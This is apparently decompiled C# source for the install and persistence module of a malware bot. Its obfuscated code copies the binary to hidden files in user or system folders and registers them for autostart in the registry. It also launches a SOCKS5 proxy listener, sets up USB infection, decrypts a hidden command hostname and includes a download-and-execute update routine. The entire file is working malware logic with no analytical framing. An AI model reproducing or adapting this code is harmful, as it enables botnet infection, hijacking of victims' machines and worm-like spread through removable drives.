namespace MainBot
{
    using Helper;
    using Microsoft.Win32;
    using Peristance;
    using Socks5;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Threading;
    using USBInfection;

    internal class InstallAndMutex
    {
        private static Mutex mutex_0;
        public static RegistryKey registryKey_0;

        private static bool CheckBothFilesEqual()
        {
            foreach (string str in Configuration.ProcessFiles)
            {
                if (!MainBot.Util.CheckFileSums(Configuration.CurrentFilename, str))
                {
                    return false;
                }
            }
            return true;
        }

        private static void Deinstall()
        {
            USBInfectionHelper.StopUSBWatch();
            RegistryKeyWatcher.InvokeEvent();
            try
            {
                registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_20(), true).DeleteValue(Configuration.ProcessNames[0]);
                registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_21(), true).DeleteValue(Configuration.ProcessNames[1]);
                Registry.LocalMachine.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_19(), true).DeleteSubKey(Configuration.HWID1);
            }
            catch
            {
            }
            string[] processFiles = Configuration.ProcessFiles;
            int index = 0;
            while (true)
            {
                if (index >= processFiles.Length)
                {
                    break;
                }
                string path = processFiles[index];
                try
                {
                    if (File.Exists(path))
                    {
                        File.Delete(path);
                    }
                }
                catch
                {
                }
                index++;
            }
            try
            {
                mutex_0.Close();
            }
            catch
            {
            }
        }

        public static void DownloadAndExecuteUpdate(string Filename)
        {
            Deinstall();
            if (!MainBot.Util.DownloadAndExecute(Filename))
            {
                Process.Start(Configuration.CurrentFilename);
            }
            Environment.Exit(0);
        }

        public static void Install(string[] FilenamesToInstall)
        {
            CryptHelper.InvokeEPInformationCheck();
            CryptHelper.InvokeEPPublicKeyCheck();
            if (string.Join(Convert.ToString(0x20), FilenamesToInstall) == <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_18())
            {
                Process.Start(Configuration.CurrentFilename);
                Environment.Exit(0);
            }
            if (Configuration.IsAdmin)
            {
                registryKey_0 = Registry.LocalMachine;
            }
            else
            {
                registryKey_0 = Registry.CurrentUser;
            }
            try
            {
                Registry.CurrentUser.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_19(), true).DeleteSubKey(Configuration.HWID1);
            }
            catch
            {
            }
            MutexGeneration();
            SetSomeRegKeys();
            PeresistanceCheck();
            RegistryKeyWatcher.ThreadWatchThreads();
            PeristantHelper.StartSyncronProcess();
            Socks5Manager.SelectPortAndListen();
            USBInfectionHelper.SetupUSBWatch();
        }

        private static void MutexGeneration()
        {
            try
            {
                mutex_0 = new Mutex(true, Configuration.HWID1);
                mutex_0.ReleaseMutex();
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        private static void PeresistanceCheck()
        {
            if (Configuration.IsAdmin)
            {
                Configuration.ProcessFiles[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_9() + Configuration.ProcessFiles[0];
                Configuration.ProcessFiles[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_9() + Configuration.ProcessFiles[1];
            }
            else
            {
                Configuration.ProcessFiles[0] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_9() + Configuration.ProcessFiles[0];
                Configuration.ProcessFiles[1] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_9() + Configuration.ProcessFiles[1];
            }
            if (!CheckBothFilesEqual())
            {
                string[] processFiles = Configuration.ProcessFiles;
                int index = 0;
                while (true)
                {
                    if (index >= processFiles.Length)
                    {
                        break;
                    }
                    string str = processFiles[index];
                    if (!MainBot.Util.CheckFileSums(Configuration.CurrentFilename, str))
                    {
                        try
                        {
                            if (File.Exists(str))
                            {
                                File.Delete(str);
                            }
                            File.Copy(Configuration.CurrentFilename, str, true);
                            File.SetAttributes(str, FileAttributes.Archive | FileAttributes.Hidden);
                        }
                        catch
                        {
                        }
                    }
                    index++;
                }
                try
                {
                    if (registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_20()) == null)
                    {
                        registryKey_0.CreateSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_20());
                    }
                    if (registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_21()) == null)
                    {
                        registryKey_0.CreateSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_21());
                    }
                    registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_20(), true).SetValue(Configuration.ProcessNames[0], Configuration.ProcessFiles[0]);
                    registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_21(), true).SetValue(Configuration.ProcessNames[1], Configuration.ProcessFiles[1]);
                    if (Registry.LocalMachine.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_22() + Configuration.HWID1) == null)
                    {
                        Registry.LocalMachine.CreateSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_22() + Configuration.HWID1);
                    }
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_22() + Configuration.HWID1, true))
                    {
                        key.SetValue(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_23(), Configuration.ProcessFiles[0] + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_24());
                        key.SetValue(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_25(), 1, RegistryValueKind.DWord);
                    }
                }
                catch
                {
                }
            }
            if ((Configuration.CurrentFilename != Configuration.ProcessFiles[0]) && (Configuration.CurrentFilename != Configuration.ProcessFiles[1]))
            {
                try
                {
                    mutex_0.Close();
                    foreach (string str2 in Configuration.ProcessFiles)
                    {
                        Process.Start(str2);
                    }
                }
                catch
                {
                }
                Environment.Exit(0);
            }
            CryptHelper.XORDecrypt(ref Configuration.XOREDHostname);
        }

        private static void SetSomeRegKeys()
        {
            try
            {
                registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_26(), true).SetValue(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_27(), 2, RegistryValueKind.DWord);
                registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_26(), true).SetValue(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_28(), 0, RegistryValueKind.DWord);
                registryKey_0.OpenSubKey(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_29(), true).SetValue(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.$a(), 0, RegistryValueKind.DWord);
            }
            catch
            {
            }
        }
    }
}

